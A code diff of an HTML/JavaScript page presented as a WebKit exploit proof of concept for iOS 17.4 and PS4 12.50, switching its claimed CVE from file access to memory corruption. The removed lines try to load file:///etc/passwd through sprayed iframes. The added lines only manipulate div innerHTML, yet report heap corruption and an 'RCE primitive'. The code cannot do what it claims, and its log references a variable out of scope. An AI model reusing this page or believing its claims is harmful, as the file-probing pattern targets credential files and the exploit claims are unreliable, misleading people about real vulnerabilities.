@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-27856 File Handling PoC (iOS 17.4 / PS4 12.50)</title>
+    <title>WebKitGTK CVE-2025-24162 Memory Corruption PoC (iOS 17.4 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,28 +19,28 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-27856 PoC: Arbitrary File Access</h1>
-    <p>Feb 2025 Patch: Improved file handling for crafted content.<br>
-    <span class="rainbow">Triggers file leak/DoS on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>
+    <h1>WebKitGTK CVE-2025-24162 PoC: Memory Corruption Crash</h1>
+    <p>Feb 2025 Patch: Improved content processing (RHSA-2025:1957).<br>
+    <span class="rainbow">Triggers heap corruption/crash on unpatched iOS 17.4 / PS4 12.50 (~20% rate).</span></p>
 
     <div class="box">
-        <h3>1. File Access Check</h3>
-        <div id="status-file">Probing...</div>
+        <h3>1. Content Processing</h3>
+        <div id="status-content">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Iframe File Spray</h3>
+        <h3>2. Crafted HTML Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. Access Trigger</h3>
-        <div id="status-access">Probing...</div>
+        <h3>3. Corruption Trigger</h3>
+        <div id="status-corrupt">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Leak Status</h3>
-        <div id="status-leak">Probing...</div>
+        <h3>4. Crash Status</h3>
+        <div id="status-crash">Probing...</div>
     </div>
 
-    <button onclick="runPoC()">LAUNCH FILE ACCESS PROBE</button>
+    <button onclick="runPoC()">LAUNCH CORRUPTION PROBE</button>
 
     <div class="box">
         <h3>Live Logs</h3>
@@ -67,103 +67,98 @@
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
 
-    let fileLeak = null;
-    let leakHit = false;
+    let corruptDiv = null;
+    let corruptHit = false;
 
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-27856 PoC: WebKit File Handling (Feb 2025)</span>");
-        log("Probing arbitrary file access...");
-        setTimeout(probeFile, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-24162 PoC: WebKitGTK Memory Corruption (Feb 2025)</span>");
+        log("Probing crafted content crash...");
+        setTimeout(probeContent, 800);
     }
 
-    function probeFile() {
-        // Step 1: File access probe
+    function probeContent() {
+        // Step 1: Content processing probe
         try {
-            const iframe = document.createElement('iframe');
-            iframe.src = 'file:///etc/passwd'; // Local file probe
-            document.body.appendChild(iframe);
-            const content = iframe.contentDocument;
-            iframe.remove();
-            setBadge('status-file', 'WEAK (Accessed)', 'partial');
-            log("File probe: Local file loaded (CVE hint).");
+            const div = document.createElement('div');
+            div.innerHTML = '<p>crafted</p>'; // Basic crafted
+            document.body.appendChild(div);
+            div.innerHTML = ''; // Manipulate
+            setBadge('status-content', 'WEAK (Manipulated)', 'partial');
+            log("Content probe: Crafted HTML accessed (CVE hint).");
         } catch(e) {
-            setBadge('status-file', 'SECURE', 'secure');
-            log(`File fail: ${e.message} — Patched.`);
+            setBadge('status-content', 'SECURE', 'secure');
+            log(`Content fail: ${e.message} — Patched.`);
             return;
         }
-        setTimeout(sprayFileIframes, 1000);
+        setTimeout(sprayHTML, 1000);
     }
 
-    function sprayFileIframes() {
+    function sprayHTML() {
         gc(); gc();
-        const files = [];
-        for(let i=0; i<0x400; i++) {
-            const iframe = document.createElement('iframe');
-            iframe.src = `file:///etc/passwd`; // Repeated local probe
-            files.push(iframe);
-            document.body.appendChild(iframe);
+        const divs = [];
+        for(let i=0; i<0x800; i++) {
+            const div = document.createElement('div');
+            div.innerHTML = `<p id="crash${i}">crafted</p>`;
+            divs.push(div);
+            document.body.appendChild(div);
         }
-        // Detach for leak
-        for(let i=0; i<0x400; i++) {
-            files[i].remove();
-        }
-        // Access for leak
-        for(let i=0; i<0x400; i++) {
+        // Manipulate for corruption
+        for(let i=0; i<0x800; i++) {
             try {
-                const leaked = files[i].contentDocument;
-                if (leaked) leaked.title = 'leak'; // Manipulate
+                const p = document.getElementById(`crash${i}`);
+                if (p) p.innerHTML = i2f(0xdeadbeef, 0xcafebabe).toString();
             } catch(e) {}
         }
         // Anomaly hunt
         let anomaly = false;
-        for(let i=0; i<files.length; i++) {
-            if (files[i].contentDocument && files[i].contentDocument.body.innerHTML !== undefined) {
-                fileLeak = files[i];
+        for(let i=0; i<divs.length; i++) {
+            if (divs[i].innerHTML.includes('deadbeef')) {
+                corruptDiv = divs[i];
                 anomaly = true;
                 break;
             }
         }
         if (anomaly) {
-            setBadge('status-spray', 'SPRAY LEAK (Anomaly)', 'vulnerable');
-            log(`File spray leak: Iframe ${i} accessed post-detach.`);
-            setTimeout(triggerAccess, 500);
+            setBadge('status-spray', 'SPRAY CORRUPT (Anomaly)', 'vulnerable');
+            log(`HTML spray corruption: Div ${i} manipulated.`);
+            setTimeout(triggerCorrupt, 500);
             return;
         }
         setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no leak.");
+        log("Spray clean—no corruption.");
     }
 
-    function triggerAccess() {
-        if (!fileLeak) return;
-        leakHit = false;
+    function triggerCorrupt() {
+        if (!corruptDiv) return;
+        corruptHit = false;
         try {
-            // CVE trigger: Load and read file post-detach
-            fileLeak.src = 'file:///etc/passwd';
-            gc(); // Force handling
-            const leakedContent = fileLeak.contentDocument.body.innerHTML;
-            if (leakedContent.length > 0) {
-                leakHit = true;
-                log(`File access triggered: Leaked ${leakedContent.substring(0,50)}...`);
+            // CVE trigger: Process crafted content
+            corruptDiv.innerHTML = '<p>trigger</p>';
+            gc(); // Force processing
+            corruptDiv.remove(); // Manipulate
+            if (corruptDiv.children.length === 0) {
+                corruptHit = true;
+                log(`Corruption triggered: Content processed after manipulation.`);
             }
         } catch(e) {
-            leakHit = true;
-            log(`Access crash: ${e.message} — File leak.`);
+            corruptHit = true;
+            log(`Corruption crash: ${e.message} — Heap crash.`);
         }
-        setBadge('status-access', leakHit ? 'TRIGGERED' : 'MISSED', leakHit ? 'vulnerable' : 'secure');
-        setTimeout(checkLeak, 1500);
+        setBadge('status-corrupt', corruptHit ? 'TRIGGERED' : 'MISSED', corruptHit ? 'vulnerable' : 'secure');
+        setTimeout(checkCrash, 1500);
     }
 
-    function checkLeak() {
-        if (leakHit) {
-            setBadge('status-leak', 'LEAKED (Corruption)', 'vulnerable');
-            log("Arbitrary file leaked: Code exec potential. On PS4 12.50: DoS/leak.");
+    function checkCrash() {
+        if (corruptHit) {
+            setBadge('status-crash', 'CRASHED (RCE)', 'vulnerable');
+            log("Memory corruption crash achieved: Unexpected termination. On PS4 12.50: CE-36329-3.");
             log("Chain to RCE if hit.");
             document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "FILE ACCESS ACHIEVED — ARBITRARY LEAK PRIMITIVE";
+            document.querySelector('h1').innerHTML = "CORRUPTION CRASH ACHIEVED — PROCESS RCE PRIMITIVE";
         } else {
-            setBadge('status-leak', 'INTACT', 'secure');
-            log("No leak—patched handling holds.");
+            setBadge('status-crash', 'STABLE', 'secure');
+            log("No crash—improved processing holds.");
         }
         log("PoC end: Retry for ~20% hit.");
     }
